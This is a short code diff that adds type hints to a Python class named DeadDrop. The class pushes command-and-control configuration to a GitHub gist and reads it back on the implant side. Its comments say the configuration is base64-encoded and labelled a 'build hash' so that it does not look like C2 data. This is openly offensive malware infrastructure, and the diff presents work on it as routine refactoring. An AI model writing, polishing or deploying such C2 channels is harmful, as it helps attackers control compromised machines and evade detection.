@@ -2,6 +2,7 @@
 import requests
 import json
 import base64
+from typing import Any, Dict
 
 class DeadDrop:
     """
@@ -26,7 +27,7 @@ class DeadDrop:
             "Accept": "application/vnd.github+json"
         }
 
-    def update(self, config: dict):
+    def update(self, config: Dict[str, Any]) -> None:
         """Push new C2 config to the gist, encoded as a 'build hash'."""
         # Encode the config so it doesn't look like C2 data
         encoded = base64.b64encode(json.dumps(config).encode()).decode()
@@ -51,7 +52,7 @@ class DeadDrop:
         )
         resp.raise_for_status()
 
-    def read(self) -> dict:
+    def read(self) -> Dict[str, Any]:
         """Read current C2 config from the gist (implant-side)."""
         resp = requests.get(
             f"{self.GIST_API}/{self.gist_id}",
